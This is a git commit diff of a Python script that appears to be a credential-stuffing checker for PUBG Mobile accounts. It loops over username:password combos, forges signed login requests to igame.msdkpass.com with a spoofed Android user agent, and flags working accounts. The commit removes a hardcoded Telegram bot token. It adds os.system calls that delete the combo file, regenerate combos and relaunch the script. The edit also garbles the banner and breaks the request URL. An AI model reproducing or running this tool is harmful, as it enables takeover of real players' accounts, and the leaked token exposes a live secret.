8fde50956ffdfb5fe8c1a451cd06cc48c78e2cda
7afed131 <57588389+7afed131@users.noreply.github.com>
2021-05-30 21:57:23 +0200

    Update checkerq.py

--- checkerq.py
+++ checkerq.py
@@ -12,17 +12,17 @@ print(f"""\x1b[32;1m
 
              _                  _               _             
             | |                | |             | |            
- _ __  _   _| |__   __ _    ___| |__   ___  ___| | _____ _ __ 
-| '_ \| | | | '_ \ / _` |  / __| '_ \ / _ \/ __| |/ / _ \  '__|
-| |_) | |_| | |_) | (_| | | (__| | | |  __/ (__|   <  __/ |   
-| .__/ \__,_|_.__/ \__, |  \___|_| |_|\___|\___|_|\_\___|_|   
-| |                 __/ |                                     
-|_|                |___/                                      
+ _   _   _| |    _    _| |   _  _| | _ _  
+| '_ \| | | | '_ \ / _` |  / | '_ \ / _ \/ | |/ / _ \  '|
+| |_) | |_| | |_) | (_| | | (| | | |  / (|   <  / |   
+| ./ \__,_|_./ \, |  \___|_| |_|\___|\___|_|\_\___|_|   
+| |                 / |                                     
+|_|                |_/                                      
 
 \x1b[39;1mDiv ==> @X888E    CH ==> @E999G 
 """)
-ID = '948449142'
-token = '1706448122:AAEauXhifuALNv74ChxogexxnTbFnFn541M'
+ID = input("Enter Your ID: ")
+token = input("Enter Your Token: ")
 combos = open("acc.txt", "r").read().splitlines()
 for combo in combos:
     try:
@@ -40,7 +40,7 @@ for combo in combos:
     ————————————————\n"""
     token11 = hashlib.md5(bytes(f'{passw}', encoding='utf-8')).hexdigest()
     token22 = hashlib.md5(bytes(
-        "/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\"" + user + "\",\"account_type\":2,\"area_code\":\"964\",\"extra_json\":\"\",\"password\":\"" + token11 + "\"}3ec8cd69d71b7922e2a17445840866b26d86e283",
+        "/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=en_US&os=1{\"account\":\"" + user + "\",\"account_type\":2,\"area_code\":\"964\",\"extra_json\":\"\",\"password\":\"" + token11 + "\"}3ec8cd69d71b7922e2a17445840866b26d86e283",
         encoding="utf-8")).hexdigest()
     tokenpriv11 = ""
     for i in range(6):
@@ -50,7 +50,7 @@ for combo in combos:
         tokenpriv11 += "".join(random.choice(string.digits))
     headers2 = {
         "Content-Type": "application/json; charset=utf-8",
-        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.{tokenpriv11})",
+        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 10; RMX1971 Build/QKQ1.{tokenpriv11})",
         "Host": "igame.msdkpass.com",
         "Connection": "Keep-Alive",
         "Accept-Encoding": "gzip, deflate",
@@ -58,7 +58,7 @@ for combo in combos:
     }
     data2 = "{\"account\":\"" + user + "\",\"account_type\":2,\"area_code\":\"964\",\"extra_json\":\"\",\"password\":\"" + token11 + "\"}"
     r2 = requests.get(
-        f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={token22}",
+        f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=en_US&os=1=sig={token22}",
         data=data2, headers=headers2)
     d += 1
     if "token" in r2.text:
@@ -75,8 +75,6 @@ for combo in combos:
         print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
     elif '"msg":"wrong password!"' in r2.text:
         print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
-os.system( rm -rif acc.txt )
-
-os.system( python3 gen.py )
-
-os.system( python3 checkerq.py )       
+os.system('rm -rif acc.txt')
+os.system('python3 gen.py')
+os.system('python3 checkerq.py')
